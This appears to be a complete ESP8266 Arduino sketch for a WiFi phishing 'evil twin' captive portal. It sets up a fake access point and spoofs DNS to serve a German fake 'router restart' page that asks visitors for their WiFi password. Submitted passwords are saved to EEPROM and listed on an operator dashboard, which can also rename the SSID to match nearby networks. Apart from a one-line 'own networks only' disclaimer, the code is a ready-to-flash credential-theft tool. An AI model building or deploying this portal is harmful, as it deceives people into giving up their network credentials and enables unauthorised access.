#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Portal";

// Init system settings
const int ledPin = D2;
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 1, 1); // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";
String scan = "";
String networks = "";
String conClients = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
  "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
  "div { padding: 0.5em; }"
  "h1 { margin: 0.5em 0 0 0; padding: 0.5em; line-height: 1.02em;}"
  "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
  "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
  "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
  "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
  "textarea { width: 100%; }"; 

void handleIndex() {
  String cSsid = String(currentSSID);
  
  String html = "<!DOCTYPE html><html>"
    "<head><title>" + cSsid + " :: Fehler!</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + cSsid + "</b> Router Error</nav><div><h1>Notwendiger Neustart des Routers</h1></div><div>"
    "<div>Sehr geehrter Nutzer, wir bedauern, Ihnen mitteilen zu müssen, dass wir aufgrund eines technischen Problems einen Neustart Ihres Routers empfehlen. Dieser Neustart ist erforderlich, um die ordnungsgemäße Funktion Ihres Internetzugangs sicherzustellen. Um den Neustart durchzuführen müssen sie ihr WiFi Passwort, als bestetigung das sie Autorisiert sind den Neustart durchzuführen, eingeben.</ol></div><div><form action=/post method=post><label>WiFi password:</label>"
    "<input type=password name=m></input><input type=submit value=Neustart></form>"
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";

    webServer.send(200, "text/html", html);
}

void handleFixing() {
  String cSsid = String(currentSSID);
  
  String html = "<!DOCTYPE html><html>"
    "<head><title>" + cSsid + " :: Restarting!</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + cSsid + "</b>Der Neustart wird durchgeführt!</nav><div><h1>Notwendiger Neustart des Routers</h1></div><div>"
    "<div>Sehr geehrter Nutzer,  Der Neustart wird durchgeführt dieser Prozess kann einige Minuten dauern, wird danken ihn für ihre Gedult.</ol></div><div><form action=/post method=post>"
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";

    webServer.send(200, "text/html", html);
}

void handlePost(){
  String pass = input("m");
  pass = "<tr><td>" + pass + "</tr></td>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();

  LED(true);
  handleFixing();
}

void postSSID(String postedSSID) {
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAPdisconnect(true);
  delay(5000);
  WiFi.softAP(postedSSID);
  currentSSID = postedSSID;
}

void clearPass() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  delay(2000);
  webServer.sendHeader("Location", String("/dashboard"), true);
  webServer.send ( 302, "text/plain", "");
}

void LED(bool light) { // Turns the LED on(true) and off(false).
  if (light == true){
    digitalWrite(BUILTIN_LED, LOW);
  } else {
    digitalWrite(BUILTIN_LED, HIGH);
  }
  
}

void handleDashboard() {
  String _html = "";
  String acColor = "#ff0003";

  _html ="<html>";
  _html += "<head>";
  _html += "<meta name=\"viewport\" content=\"initial-scale=1.0, width=device-width\">";
  _html += "<title> Captive Portal Dashboard</title>";
  _html += "<style>";
  _html += "body {";
  _html += "background: #1a1a1a;";
  _html += "color: #bfbfbf;";
  _html += "font-family: sans-serif;";
  _html += "margin: 0; }";
  
  _html += ".content {max-width: 800px;margin: auto;}";

  _html += ".button-container {display: flex;}";
  
  _html += "table {border-collapse: collapse;}";
  
  _html += "th, td {";
  _html += "padding: 10px 6px;";
  _html += "text-align: left;";
  _html += "border-style:solid;";
  _html += "border-color: #bfbfbb;  }";
  
  _html += "button, input {";
  _html += "display: inline-block;";
  _html += "height: 38px;";
  _html += "padding: 0 20px;";
  _html += "color:#fff;";
  _html += "text-align: center;";
  _html += "font-size: 11px;";
  _html += "font-weight: 600;";
  _html += "line-height: 38px;";
  _html += "letter-spacing: .1rem;";
  _html += "text-transform: uppercase;";
  _html += "text-decoration: none;";
  _html += "white-space: nowrap;";
  _html += "background: #2f3136;";
  _html += "border-radius: 4px;";
  _html += "border: none;";
  _html += "cursor: pointer;";
  _html += "box-sizing: border-box;";
  _html += "margin-right: 10px; }";
  
  _html += "button:hover {";
  _html += "background: #42444a; }";
  
  _html += "h1 {";
  _html += "font-size: 1.7rem;";
  _html += "margin-top: 1rem;";
  _html += "background: #2f3136;";
  _html += "color: #bfbfbb;";
  _html += "padding: 0.2em 1em;";
  _html += "border-radius: 3px;";
  _html += "border-left: solid "+ acColor +" 8px;";
  _html += "font-weight: 100;";
  _html += "padding-left: 9px; }";
  _html += "</style>";
  
  _html += "<body>";
  _html += "<div class=\"content\">";
  _html += "<h1 style=\"padding: 0.2em 0.1em; text-align: center; font-size: 2.5rem;\">Captive Portal Dashboard</h1>";

  _html += "<span style=\"color: "+ acColor +";\">INFO: </span><br>";
  _html += "<span>";
  _html += "- This project is a proof of concept for testing and educational purposes.<br>";
  _html += "- Use it only against your own networks and devices!<br>";
  _html += "- Special Credits: spacehuhntech, sankethj, 125K";
  _html += "</span>";

  _html += "<h1>Change SSID</h1>";
  _html += "<form><input style=\'text-align: left;' type=text placeholder='New SSID' name=ssid></input><input type=submit value=Change SSID action='/?ssid={"+ input("ssid") + "}'></form>";

  _html += "<h1>Captured Passwords</h1>";
  _html += "<div class='button-container'>";
  
  _html += "<form style='display:inline-block;' method='post' action='/dashboard?delpasswd'><button style='display:inline-block;'>Delete Passwords</button></form>";
  
  _html += "<form style='display:inline-block;' method='post' action='/dashboard?led_off'><button style='display:inline-block;'>Disable LED</button></form>";
  _html += "</div>";
 
  
  if (allPass == "") {
    _html += "<p><b>No Passwords Captured yet!</b></p>";
  } else {
     _html += "<table><tbody><tr><th>Password</th></tr>";
    
    //add passwords
    _html += allPass;

    _html += "</tbody></table>";
  }
  _html += "</div>";
  _html += "<div class=\"content\">";
  _html += "<h1 style=\"margin-top: 35px;\">Nearby Networks</h1>";
  _html += "<table><tbody><tr><th>SSID</th><th>Signal Strength</th></tr>";
  
  //scan and display nearby networks
  int numNetworks = WiFi.scanNetworks();
  for (int i = 0; i < numNetworks; i++) {
    _html += "<tr><td>" + WiFi.SSID(i) + "</td>" + "<td>" + WiFi.RSSI(i) + "</td></tr>";
  }
  _html += "</tbody></table>";
  _html += "</div>";
  _html += "</body>";
  _html += "</html>";

  webServer.send(200, "text/html", _html);

  if (webServer.hasArg("ssid")){
    postSSID(webServer.arg("ssid"));
  }
  if (webServer.hasArg("led_off")){
    LED(false);
  }
  if (webServer.hasArg("delpasswd")){
    clearPass();
  }
}

void setup(){
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  
  WiFi.softAP(currentSSID);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)

  webServer.on("/", handleIndex);
  webServer.on("/dashboard", handleDashboard);
  webServer.on("/post", handlePost);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);

}

void loop(){
  dnsServer.processNextRequest();
  webServer.handleClient();
}
